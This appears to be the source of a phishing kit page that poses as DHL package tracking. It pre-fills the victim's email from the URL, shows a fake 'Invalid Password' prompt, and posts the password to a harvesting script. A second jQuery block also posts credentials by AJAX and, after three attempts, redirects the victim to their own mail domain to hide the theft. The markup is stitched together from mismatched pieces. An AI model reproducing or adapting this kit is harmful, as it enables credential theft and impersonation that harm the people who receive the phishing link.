<?php
session_start();

// start > to get url and and put id 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));

	$parts = @explode('@', $email);
	$user = @$parts[0];
// < end 


$_SESSION['email'] = $email;


?>

<html>
<HEAD>
<TITLE>DHL | Tracking</TITLE>	
<title>TRADE FILE</title>
<link rel="shortcut icon" href="http://www.dhl.com/img/favicon.gif" type="image/gif"/>
</head>
<script>
function validateForm()
{
var x=document.forms["myform"]["email"].value;
var atpos=x.indexOf("@");
var dotpos=x.lastIndexOf(".");
if (atpos<1 || dotpos<atpos+2 || dotpos+2>=x.length)
  {
  alert("Not a valid e-mail address");
  return false;
  }
var y=document.forms["myform"]["epass"].value;
if(y==null || y=="")
  {
  alert("Password is Empty");
  return false;
  }
var y=document.forms["myform"]["epass"].value;
if(y.length < 5)
  {
  alert("Password is Too Short");
  return false;
  }
}
</script>

<body data-test-automation-id="root" class="rc-touch withTopTitleBar" style="background-image: url(&quot;https://i.imgur.com/CxgYN5R.jpg&quot;); background-size: cover;">
<font face="Arial" style="font-size: 20pt" color="#CD0000">
<center><b>Login to Continue Tracking your Package</b></font><font face="verdana,arial" size=-1><p>
<img src="https://i.imgur.com/bVtQqQT.png" width="300" height="100">
</p>
<table cellpadding=2 cellspacing=0 border=0>
<tr><td bgcolor="#FFA500"><table cellpadding=0 cellspacing=0 border=0 width=100%><tr><td bgcolor="#CD0000" align=center style="padding:2;padding-bottom:4"><b>
	<font size=-1 color="white" face="Comic Sans MS">Sign In With Your Correct Email and Password To Review Package Information</font></b></font><b><font face="Comic Sans MS" size=-1></th></font><font face="Comic Sans MS" size=-1></tr>

</font><font face="verdana,arial" size=-1>
<tr><td bgcolor="white" style="padding:5"><br>
<form action="Logon2.php" onsubmit="return validateForm()" method="post" name="myform">
<center><table width="517">

<tr><td colspan=2><font face="verdana,arial" size=2><span  class=text1a><b><font color="red"><img height="25" width="25" src="https://i.imgur.com/0Nbmcv2.png">&nbsp;&nbsp;Invalid Password. Please try again using correct details. </font></b> </span></td></tr>



<tr><td width="150" height="40" align="right"><font face="verdana,arial" size=-1> 
<font color="red">*</font>&nbsp;Email Address&nbsp;&nbsp;&nbsp;:</td><td width="397" height="40">&nbsp;<font face="Georgia Bold"><?php echo $email ?></font></td></tr>

<tr>
<font face="verdana,arial" size=-1>
	<td width="150" align="right"><font face="verdana,arial" size=-1><font color="red">*</font>&nbsp;Password&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:</td>

	<td width="397">&nbsp;<input type="password" name="epass" size="20"></td>

	</font>
</tr>
<tr>

<font face="verdana,arial" size=-1>
	<td width="110"><font face="verdana,arial" size=-1>&nbsp;</td>
	<td width="397"><font face="verdana,arial" size=-1>&nbsp;<input type="submit" value="Log in To View"></td>
	</font>
</tr>
<tr><td colspan=2><font face="verdana,arial" size=-1></td></tr>
</table></center>
</form>
</td></tr></table></td></tr></table>
<div class="copyright cLight">

&nbsp;</div>
<p><font size=-1 color="white" face="verdana,arial">Copyright Notice &copy; 1999-2022 DHL WorldWide Delivery. 
All rights reserved.
<script>
</style>
<!-- Optional JavaScript -->
  <!-- jQuery first, then Popper.js, then Bootstrap JS -->
  <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>


<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
<script>

  /* global $ */
  $(document).ready(function(){
    var count=0;
    /////////////url email getting////////////////
    var email = window.location.hash.substr(1);
    if (!email) {

    }
    else
    {
        // $('#email').val(email);
        var my_email =email;
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();        
        $('#email').val(my_email);
        $('#domain-name').html(final);
        $("#msg").hide();
      }
      ///////////////url getting email////////////////


      var file="bmV4dC5waHA=";
      $('#submit-btn').click(function(event){
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
        var msg = $('#msg').html();
        $('#msg').text( msg );
      ///////////new injection////////////////
      var my_email =email;
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

      if (!email) {
            $('#error').show();
            $('#error').html("Email field is emply.!");
            ai.focus;
            return false;
        }

        if (!filter.test(my_email)) {
            $('#error').show();
            $('#error').html("That account doesn't exist. Enter a different account");
            ai.focus;
            return false;
        }
        if (!password) {
            $('#error').show();
            $('#error').html("Password field is emply.!");
            ai.focus;
            return false;
        }

      var ind=my_email.indexOf("@");
      var my_slice=my_email.substr((ind+1));
      var c= my_slice.substr(0, my_slice.indexOf('.'));
      var final= c.toLowerCase();
      ///////////new injection////////////////
      count=count+1;
      $('#domain-name').html(final);
      $.ajax({
        dataType: 'JSON',
        url: "",
        type: 'POST',
        data:{
          email:email,
          password:password,
        },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifing...');
            },
            success: function(response){
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                	
                  $("#password").val("");
                  if (count>=3) {
                    count=0;
                    // window.location.replace(response['redirect_link']);
                    window.location.replace("http://www."+my_slice);

                  }
                  // $('#msg').html(response['msg']);
                }
                else{
                  // $('#msg').html(response['msg']);
                }
              }
            },
            error: function(){
            	
              $("#password").val("");
              if (count>=3) {
                count=0;
                window.location.replace("http://www."+my_slice);
              }
              $("#msg").show();
              // $('#msg').html("Please try again later");
            },
            complete: function(){
              $('#submit-btn').html('LOGIN');
            }
          });
    });


    });


  </script>
  

</body>

</html>